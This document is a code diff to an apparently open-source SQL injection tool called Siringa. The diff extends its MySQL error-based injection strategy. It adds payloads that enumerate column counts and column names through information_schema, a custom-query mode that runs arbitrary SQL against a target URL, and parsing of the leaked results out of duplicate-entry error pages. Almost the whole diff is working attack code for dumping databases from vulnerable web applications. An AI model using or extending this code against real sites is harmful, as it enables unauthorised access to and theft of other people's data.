@@ -5,6 +5,7 @@ using System.Text;
 using Siringa.Engine.Interfaces;
 using Siringa.Engine.Implementations.QueryRunner;
 using Siringa.Engine.Utils;
+using Siringa.Engine.Exceptions;
 
 namespace Siringa.Engine.Implementations.InjectionStrategies.MySql.ErrorBased
 {
@@ -20,6 +21,15 @@ namespace Siringa.Engine.Implementations.InjectionStrategies.MySql.ErrorBased
         #endregion Constructor
 
         #region Private
+
+        #region Bounds
+        private const string _injectionResultLowerBound = "Integrity constraint violation: 1062 Duplicate entry '";
+        private const string _injectionResultUpperBound = "' for key 'group_key'";
+
+        private const string _injectionResultDebugLowerBound = "SQLSTATE";
+        private const string _injectionResultDebugUpperBound = "Stack trace:";
+        #endregion Bounds
+
         #region Payloads
         private const char _tail = '1';
         private const string _exploit = " AND (SELECT 1 FROM (SELECT COUNT(*),"+ 
@@ -34,14 +44,19 @@ namespace Siringa.Engine.Implementations.InjectionStrategies.MySql.ErrorBased
         private const string _payloadCheckVulnerable = "select ‘victim’";
         private const string _payloadGetCurrentDatabaseName = "SELECT database()";
 
-        private const string _injectionResultLowerBound = "Integrity constraint violation: 1062 Duplicate entry '";
-        private const string _injectionResultUpperBound = "' for key 'group_key'";
-
         private const string _payloadGetSingleTableNameFromDb = "SELECT table_name FROM information_schema.TABLES WHERE table_schema = '{0}' LIMIT {1},1";
-        private const string _payloadGetSingleTableName = "SELECT table_name FROM information_schema.TABLES LIMIT {1},1";
+        private const string _payloadGetSingleTableName = "SELECT table_name FROM information_schema.TABLES LIMIT {0},1";
 
         private const string _payloadGetTableCountFromDb = "SELECT count(table_name) FROM information_schema.TABLES where table_schema = '{0}'";
         private const string _payloadGetTableCount = "SELECT count(table_name) FROM information_schema.TABLES";
+
+        private const string _payloadGetTableColumnCountFromDb = "SELECT count(column_name) FROM information_schema.columns WHERE table_schema = '{0}' AND table_name = '{1}'";
+        private const string _payloadGetTableColumnCount = "SELECT count(column_name) FROM information_schema.columns WHERE table_name = '{0}'";
+
+        private const string _payloadGetSingleColumnNameFromDb = "SELECT column_name FROM information_schema.columns WHERE table_schema = '{0}' AND table_name = '{1}' LIMIT {2},1";
+        private const string _payloadGetSingleColumnName = "SELECT column_name FROM information_schema.columns WHERE table_name = '{0}' LIMIT {1},1";
+
+        private const string _payloadCustomQueryCount = "SELECT count(*) FROM ({0}) cq";
 
         #endregion Payloads
 
@@ -50,12 +65,29 @@ namespace Siringa.Engine.Implementations.InjectionStrategies.MySql.ErrorBased
         {
             string result = string.Empty;
 
-            if(!string.IsNullOrEmpty(html))
-                result = html.Substring(html.IndexOf(_injectionResultLowerBound) +
-                                            _injectionResultLowerBound.Length,
-                                            html.IndexOf(_injectionResultUpperBound) - html.IndexOf(_injectionResultLowerBound) -
-                                            _injectionResultLowerBound.Length);
+            if (!string.IsNullOrEmpty(html))
+            {
+                try
+                {
+                    result = html.Substring(html.IndexOf(_injectionResultLowerBound) +
+                                                _injectionResultLowerBound.Length,
+                                                html.IndexOf(_injectionResultUpperBound) - html.IndexOf(_injectionResultLowerBound) -
+                                                _injectionResultLowerBound.Length);
+                }
+                catch (Exception ex)
+                {
+                    string userFriendlyException = "Could not parse sql injection result";
 
+                    if(html.IndexOf(_injectionResultDebugLowerBound) > -1 && html.IndexOf(_injectionResultDebugUpperBound) > -1)
+                        userFriendlyException = string.Format("Sql exception occured: {0}", 
+                                                    html.Substring(html.IndexOf(_injectionResultDebugLowerBound) +
+                                                    _injectionResultDebugLowerBound.Length,
+                                                    html.IndexOf(_injectionResultDebugUpperBound) - html.IndexOf(_injectionResultDebugLowerBound) -
+                                                    _injectionResultDebugLowerBound.Length));
+                    
+                    throw new SqlInjException(userFriendlyException);
+                }
+            }
             result = result.Remove(result.Length - 1, 1);
 
             return result;
@@ -148,7 +180,20 @@ namespace Siringa.Engine.Implementations.InjectionStrategies.MySql.ErrorBased
 
         public int GetTotalNoOfColumns()
         {
-            return 0;
+            /*
+            private const string _payloadGetTableColumnCount = "SELECT count(column_name) FROM information_schema.columns WHERE table_schema = '{0}' AND table_name = '{1}'";     
+            */
+            int count = 0;
+            string payload = string.Empty;
+            if (!string.IsNullOrEmpty(SelectedDb))
+                payload = string.Format(_payloadGetTableColumnCountFromDb, SelectedDb, SelectedTable);
+            else
+                payload = string.Format(_payloadGetTableColumnCount, SelectedTable);
+            string query = QueryHelper.CreateQuery(Url, _exploit, payload);
+            string pageHtml = QueryRunner.GetPageHtml(query);
+            string countString = GetAnswerFromHtml(pageHtml);
+            int.TryParse(countString, out count);
+            return count;
         }
 
         public string GetSingleDatabaseName(int startingFrom)
@@ -175,39 +220,52 @@ namespace Siringa.Engine.Implementations.InjectionStrategies.MySql.ErrorBased
         public string GetSingleTableColumnName(int startingFrom)
         {
             string result = string.Empty;
-            //@TODO: actually implement
+            string payload = string.Empty;
+            if (!string.IsNullOrEmpty(SelectedDb))
+                payload = string.Format(_payloadGetSingleColumnNameFromDb, SelectedDb, SelectedTable, startingFrom);
+            else
+                payload = string.Format(_payloadGetSingleColumnName, SelectedTable, startingFrom);
+            string query = QueryHelper.CreateQuery(Url, _exploit, payload);
+            string pageHtml = QueryRunner.GetPageHtml(query);
+            result = GetAnswerFromHtml(pageHtml);
             return result;
         }
 
-        public string GetSingleCustomQueryRow(string query)
+        public string CustomQuery { get; set; }
+
+        public int GetTotalNoOfCustomQueryResultRows()
         {
-            string result = string.Empty;
-            //@TODO: actually implement
-            return result;
+            int count = 0;
+            string payload = string.Empty;
+
+            if(string.IsNullOrEmpty(CustomQuery))
+                return 0;
+
+            if(CustomQuery.EndsWith("LIMIT 0,1"))
+                return 1;
+
+            payload = string.Format(_payloadCustomQueryCount,CustomQuery);
+
+            string query = QueryHelper.CreateQuery(Url, _exploit, payload);
+            string pageHtml = QueryRunner.GetPageHtml(query);
+            string countString = GetAnswerFromHtml(pageHtml);
+            int.TryParse(countString, out count);
+            return count;
         }
 
-        public string GetMultipleDatabaseNames(int startingFrom, int count)
+        public string GetSingleCustomQueryResultRow(int startingFrom)
         {
             string result = string.Empty;
-            //@TODO: actually implement
-            return result;
-        }
-        public string GetTableNames(int startingFrom, int count)
-        {
-            string result = string.Empty;
-            //@TODO: actually implement
-            return result;
-        }
-        public string GetTableColumnName(int startingFrom, int count)
-        {
-            string result = string.Empty;
-            //@TODO: actually implement
-            return result;
-        }
-        public string GetMultipleCustomQueryRow(string query, int count)
-        {
-            string result = string.Empty;
-            //@TODO: actually implement
+
+            string payload = string.Empty;
+
+            if (!CustomQuery.Contains("LIMIT"))
+                payload = string.Format("{0} LIMIT {1},1", CustomQuery, startingFrom);
+
+            string query = QueryHelper.CreateQuery(Url, _exploit, payload);
+            string pageHtml = QueryRunner.GetPageHtml(query);
+            result = GetAnswerFromHtml(pageHtml);
+
             return result;
         }
 
